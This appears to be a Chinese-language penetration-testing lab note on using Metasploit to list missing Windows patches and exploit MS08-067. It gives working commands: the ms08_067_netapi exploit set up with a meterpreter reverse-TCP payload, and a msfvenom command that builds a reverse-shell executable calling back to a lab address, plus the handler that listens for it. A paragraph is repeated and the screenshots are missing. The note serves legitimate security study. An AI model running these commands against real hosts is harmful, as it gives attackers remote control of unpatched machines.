msf信息收集--补丁查找

```
Windows缺少的补丁
– 基于已经获取到的session进行检测
– use post/windows/gather/enum_patches 
▪ show advanced
▪ set VERBOSE yes
– 检查失败
▪ Known bug in WMI query, try migrating to another process
▪ 迁移到另一个进程再次尝试（也就是进程注入migrating）
```

ms08_067在初次使用不成功以后，需要重启靶机电脑，因为它会打乱电脑的一些设置，导致后面再试的时候会不成功

**ms08_067   KB958644**

Windows缺少的补丁
– 基于已经获取到的session进行检测
– use post/windows/gather/enum_patches 
▪ show advanced
▪ set VERBOSE yes
– 检查失败
▪ Known bug in WMI query, try migrating to another process
▪ 迁移到另一个进程再次尝试（也就是进程注入migrating）


use exploit/windows/smb/ms08_067_netapi
set rhosts 192.168.88.131
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.88.130
run
(若有该漏洞，则会执行成功)
（注意到payload的使用位置了么）

因为没有机器，所以自己制作了一个peyload使用一下
```
msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.88.130 lport=55555 -f exe -o /root/Desktop/leetest/123.exe

use exploit/multi/handler

set payload windows/x64/meterpreter_reverse_tcp

run -j -z

```
![093804844b494b1810107285bbe9caf9.png](25fad61d3b884dfb99b2b99dabcac1f0.png)


回到模块，继续进行

![7f9b2af956637b185b48c05c8a9730c4.png](4b35799ecdcf4673b830cbbca22deebf.png)

显示信息用提示的是因为缺少这些补丁，所以后面的那些ms也许可以利用



















